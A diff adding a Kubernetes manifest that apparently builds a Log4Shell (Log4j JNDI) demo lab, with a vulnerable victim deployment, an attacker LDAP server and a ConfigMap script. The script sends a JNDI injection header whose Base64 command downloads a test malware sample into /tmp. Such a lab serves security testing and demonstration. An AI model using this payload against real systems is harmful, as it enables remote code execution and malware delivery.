@@ -1,0 +1,106 @@
+# kubectl exec -it deploy/victim -- ls /tmp
+# kubectl exec -it deploy/att-svr -- bash /app/attack.sh
+# kubectl exec -it deploy/victim -- ls /tmp
+
+apiVersion: v1
+data:
+  attack.sh: |+
+    #!/bin/bash
+    ATTACK_URL='X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3R
+lc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
+    ATTACK_COMMAND="curl victim:8080 -H '${ATTACK_URL}'"
+    eval "$ATTACK_COMMAND"
+
+kind: ConfigMap
+metadata:
+  creationTimestamp: null
+  name: attacker-script-cm
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  creationTimestamp: null
+  labels:
+    app: victim
+  name: victim
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: victim
+  strategy: {}
+  template:
+    metadata:
+      creationTimestamp: null
+      labels:
+        app: victim
+    spec:
+      containers:
+      - image: us-central1-docker.pkg.dev/panw-utd-public-cloud/utd-public-images/utd-cnsp/log4j-victim:1.0
+        name: l4s-demo-app
+---
+apiVersion: v1
+kind: Service
+metadata:
+  creationTimestamp: null
+  labels:
+    app: victim
+  name: victim
+spec:
+  ports:
+  - port: 8080
+    protocol: TCP
+    targetPort: 8080
+  selector:
+    app: victim
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  creationTimestamp: null
+  labels:
+    app: att-svr
+  name: att-svr
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: att-svr
+  strategy: {}
+  template:
+    metadata:
+      creationTimestamp: null
+      labels:
+        app: att-svr
+    spec:
+      containers:
+      - image: us-central1-docker.pkg.dev/panw-utd-public-cloud/utd-public-images/utd-cnsp/log4j-attacker:1.0
+        name: att-svr
+        volumeMounts:
+        - name: attacker-script
+          mountPath: /app/attack.sh
+          subPath: attack.sh
+      volumes:
+        - name: attacker-script
+          configMap:
+            name: attacker-script-cm
+---
+apiVersion: v1
+kind: Service
+metadata:
+  creationTimestamp: null
+  labels:
+    app: att-svr
+  name: att-svr
+spec:
+  ports:
+  - name: port1
+    port: 8888
+    protocol: TCP
+    targetPort: 8888
+  - name: port2
+    port: 1389
+    protocol: TCP
+    targetPort: 1389
+  selector:
+    app: att-svr
